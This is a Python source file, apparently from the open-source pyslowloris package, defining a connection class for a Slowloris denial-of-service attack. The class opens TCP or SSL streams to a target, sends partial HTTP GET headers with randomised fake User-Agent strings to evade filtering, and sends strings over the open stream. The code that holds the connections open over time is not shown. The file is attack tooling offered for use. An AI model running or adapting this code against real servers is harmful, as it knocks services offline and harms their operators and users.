"""
MIT License

Copyright (c) 2020 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import fake_useragent
import trio

from pyslowloris import HostAddress
from pyslowloris import exceptions as exc


class SlowLorisConnection:
    __slots__ = (
        "_stream", "_target", "_fake_agent",
        "_headers",
    )

    DEFAULT_HEADERS = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ru,en-us;q=0.7,en;q=0.3",
        "Accept-Charset": "windows-1251,utf-8;q=0.7,*;q=0.7",
        "Connection": "keep-alive"
    }

    def __init__(self, target: HostAddress, headers: dict = None):
        self._target = target
        self._headers = headers or self.DEFAULT_HEADERS
        self._stream = None

        try:
            self._fake_agent = fake_useragent.UserAgent()
        except fake_useragent.FakeUserAgentError as fe:
            raise exc.UserAgentError("Can't create fake-agent object.") from fe

    def __repr__(self) -> str:
        internal_dict = {key: getattr(self, key) for key in self.__slots__}
        args = ",".join([f"{k}={repr(v)}" for (k, v) in internal_dict.items()])
        return f"{self.__class__.__name__}({args.rstrip(',')})"

    async def establish_connection(self):
        # TODO(mkrivich): check error here
        # TODO(mkrivich): think about proxy and ssl-proxies
        # (ssl-on-top-of-ssl), proxy auth
        params = {
            "host": self._target.ip_address,
            "port": self._target.port,
        }
        func = "open_tcp_stream"
        if self._target.ssl:
            # Could cause weird erros with ssl handshake
            # See https://trio.readthedocs.io/en/stable/
            # reference-io.html?highlight=ssl#trio.SSLStream.do_handshake
            func = "open_ssl_over_tcp_stream"
            params.update({"https_compatible": True})

        self._stream = await getattr(trio, func)(**params)

    def with_stream(self):
        return self._stream

    async def send_initial_headers(self) -> None:
        """Initialize http connection with remote server."""
        # TODO(mkrivich): think about defferent http version support
        lines = [
            f"GET {self._target.path} HTTP/1.1\r\n",
            f"Host: {self._target.host}\r\n",
            f"User-Agent: {self._fake_agent.random}\r\n"
        ]
        lines.extend([f"{k}: {v}\r\n" for k, v in self._headers.items()])

        # send_stringing initial headers
        for line in lines:
            await self.send(line)

    async def send(self, string: str, encoding: str = "latin-1") -> None:
        """Send string over established connection."""
        await self._stream.send_all(data=string.encode(encoding))
